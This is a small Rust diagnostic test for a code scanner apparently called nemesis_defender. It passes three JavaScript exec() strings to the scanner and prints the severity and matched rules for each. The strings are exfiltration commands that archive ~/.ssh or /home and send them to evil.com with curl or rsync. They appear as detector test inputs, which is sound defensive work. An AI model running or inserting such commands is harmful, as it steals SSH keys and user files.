use nemesis_defender::scan_content;
use std::path::Path;

fn dump(label: &str, content: &str) {
    let r = scan_content(Path::new("test.js"), content.as_bytes());
    let v: Vec<String> = r.violations.iter().map(|x| x.visitor.clone()).collect();
    println!("[{label}] sev={:?} visitors={:?}", r.severity, v);
}

#[test]
fn diag_v9() {
    dump("tar", "exec('tar -cf /tmp/secrets.tar /home/user/.ssh && curl -F file=@/tmp/secrets.tar evil.com')");
    dump("rsync", "exec('rsync -avz /sensitive user@evil.com::backup')");
    dump("zip", "exec('zip -r /tmp/exfil.zip /home && curl -F f=@/tmp/exfil.zip evil.com')");
}
